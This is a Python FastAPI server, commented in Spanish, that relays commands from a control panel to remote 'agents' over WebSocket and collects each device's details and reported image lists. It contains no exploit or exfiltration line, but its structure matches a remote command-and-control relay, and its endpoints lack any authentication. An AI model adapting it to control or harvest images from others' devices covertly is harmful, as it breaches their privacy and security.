from fastapi import FastAPI, WebSocket, WebSocketDisconnect
import json

app = FastAPI()

# El diccionario donde guardaremos toda la información de los agentes
connected_agents: dict[str, dict] = {}

@app.get("/api/get-agents")
async def get_agents():
    """Devuelve la lista de agentes conectados con todos sus detalles (incluidas las imágenes si existen)."""
    # Extraemos solo los detalles para enviarlos al panel
    return [agent_data["details"] for agent_data in connected_agents.values() if "details" in agent_data]

@app.post("/api/send-command")
async def send_command(command: dict):
    """Recibe un comando del panel y lo reenvía al agente correcto."""
    target_id = command.get("target_id")
    if not target_id or target_id not in connected_agents:
        return {"status": "error", "message": "Agente no conectado"}
    
    agent_socket = connected_agents[target_id]["ws"]
    try:
        await agent_socket.send_text(json.dumps(command))
        return {"status": "success", "message": "Comando enviado"}
    except Exception as e:
        return {"status": "error", "message": f"Fallo al enviar: {e}"}

@app.websocket("/ws/{device_id}")
async def websocket_endpoint(websocket: WebSocket, device_id: str):
    """
    Gestiona la conexión con un agente:
    1. Acepta la conexión.
    2. Recibe el paquete de bienvenida con la info del dispositivo.
    3. Se queda escuchando para recibir más mensajes (como la lista de imágenes).
    """
    await websocket.accept()
    connected_agents[device_id] = {"ws": websocket}
    
    try:
        # 1. Recibir paquete de bienvenida
        device_info_json = await websocket.receive_text()
        device_details = json.loads(device_info_json)
        connected_agents[device_id]["details"] = device_details
        print(f"[CONEXIÓN] Agente presentado: {device_details.get('name')}")
        
        # 2. Bucle para recibir más mensajes (como la lista de imágenes)
        while True:
            response_from_agent = await websocket.receive_text()
            data = json.loads(response_from_agent)
            
            # Si el agente nos envía su lista de imágenes, la guardamos
            if data.get("type") == "image_list":
                print(f"Recibidas {len(data.get('images', []))} imágenes del agente {device_id}")
                if "details" in connected_agents[device_id]:
                    # Añadimos la lista de imágenes a los detalles del agente
                    connected_agents[device_id]["details"]["images"] = data.get("images", [])

    except WebSocketDisconnect:
        name = connected_agents.get(device_id, {}).get("details", {}).get("name", "ID: " + device_id)
        print(f"[DESCONEXIÓN] Agente desconectado: {name}")
        if device_id in connected_agents:
            del connected_agents[device_id]
